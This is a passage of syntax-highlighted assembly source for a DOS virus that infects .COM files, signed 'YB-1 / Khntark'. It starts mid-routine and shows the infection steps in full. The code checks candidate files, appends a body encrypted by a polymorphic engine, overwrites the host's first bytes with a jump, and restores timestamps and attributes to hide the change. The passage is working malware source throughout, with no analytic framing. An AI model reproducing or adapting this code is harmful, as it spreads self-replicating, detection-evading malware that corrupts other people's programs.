            </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">232d</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1640d</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">   </span><span class="sc1">;add virus size to it</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                  </span><span class="sc1">;bigger then 64K:nogood</span><span class="sc0">
            
            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">;EXE file?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                 </span><span class="sc1">;no? good</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0"> </span><span class="sc1">;compare 1st byte to near jmp</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">INFECT</span><span class="sc0">                                  </span><span class="sc1">;not a near jmp, file ok</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">  </span><span class="sc1">;check for ' '</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">NO_GOOD</span><span class="sc0">                                   </span><span class="sc1">;file ok .. infect</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*********************        </span><span class="sc0">
</span><span class="sc1">; 5-set PTR @EOF</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;prepare to write virus on file</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">                                   </span><span class="sc1">;position file pointer,cx:dx = 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                 </span><span class="sc1">;save flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;call real int21h</span><span class="sc0">

</span><span class="sc1">;*********************        </span><span class="sc0">
</span><span class="sc1">; 6-call TpE</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">
         
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;starting offset of decryptor</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">       </span><span class="sc1">;fix bp</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">;save necessary registers</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;save file handle</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0500h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;fix new es segment</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_init</span><span class="sc0">      </span><span class="sc1">;initialize random # gen</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">   </span><span class="sc1">;initialize TPE flags</span><span class="sc0">

                                       </span><span class="sc1">;ds = cs</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                           </span><span class="sc1">;virus's starting address</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FINAL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">248d</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1640d</span><span class="sc0"> </span><span class="sc1">;size of code to be encrypted +  KTT's size + TPE's size</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                           </span><span class="sc1">;distance between decryptor &amp; code</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                          </span><span class="sc1">;call TpE</span><span class="sc0">

</span><span class="sc1">;*********************        </span><span class="sc0">
</span><span class="sc1">; 7-Write Virus</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">
         
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;restore bx=file handle</span><span class="sc0">
                           </span><span class="sc1">;cx=decryptor + code size + KRTT's  size + TPE's size</span><span class="sc0">
                           </span><span class="sc1">;write from ds:dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">                                   </span><span class="sc1">;restore necessary registers</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">                                     </span><span class="sc1">;save flags</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;call real int21h, SEGMENT OVERRIDE NEEDED</span><span class="sc0">
                                                   </span><span class="sc1">;since ds does not equal cs yet</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     
</span><span class="sc1">;*********************        </span><span class="sc0">
</span><span class="sc1">; 8-set PTR @BOF</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                         </span><span class="sc1">;locate pointer at beginning of host</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           
        </span><span class="sc6">cwd</span><span class="sc0">                                   </span><span class="sc1">;position file pointer,cx:dx = 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                 </span><span class="sc1">;save flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;call real int21h</span><span class="sc0">

</span><span class="sc1">;******************************************</span><span class="sc0">
</span><span class="sc1">; 9-write new 4 bytes to beginning of file</span><span class="sc0">
</span><span class="sc1">;******************************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_IMAGE</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                 </span><span class="sc1">;#of bytes to write</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_IMAGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;ds:dx=pointer of data to write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                               </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                     </span><span class="sc1">;save flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;call real int21h</span><span class="sc0">

</span><span class="sc1">;*************************************************        </span><span class="sc0">
</span><span class="sc1">; 10-Restore date and time of file to be infected</span><span class="sc0">
</span><span class="sc1">;*************************************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_DATE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_TIME</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                        </span><span class="sc1">;save flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;call real int21h</span><span class="sc0">

</span><span class="sc1">;****************        </span><span class="sc0">
</span><span class="sc1">; 11-Close File </span><span class="sc0">
</span><span class="sc1">;****************</span><span class="sc0">

</span><span class="sc5">GET_OUT</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                        </span><span class="sc1">;save flags</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;call real int21h</span><span class="sc0">

</span><span class="sc1">;*************************************************        </span><span class="sc0">
</span><span class="sc1">; 12-Restore file's attributes</span><span class="sc0">
</span><span class="sc1">;*************************************************</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_Name</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get filename</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_ATTR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get old attributes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                                     </span><span class="sc1">;set file attributes to cx</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">                                            </span><span class="sc1">;save flags</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;call real int21h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                              </span><span class="sc1">;infection done!</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

</span><span class="sc5">NAME_AUTHOR</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'YB-1 / Khntark'</span><span class="sc0">
</span><span class="sc5">FILES_TO_INFECT</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">START_CODE</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">  </span><span class="sc1">;area to store 5 bytes to w/r from / to file</span><span class="sc0">
</span><span class="sc5">START_IMAGE</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;REAL INT 21h's address</span><span class="sc0">

</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;reserved</span><span class="sc0">
</span><span class="sc5">DTA_File_Attr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Time</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Date</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Name</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">

</span><span class="sc5">FINAL</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;label of byte of code to be kept in virus when it moves</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0">    </span><span class="sc5">HOST</span><span class="sc0">

</span></div></body>
</html>
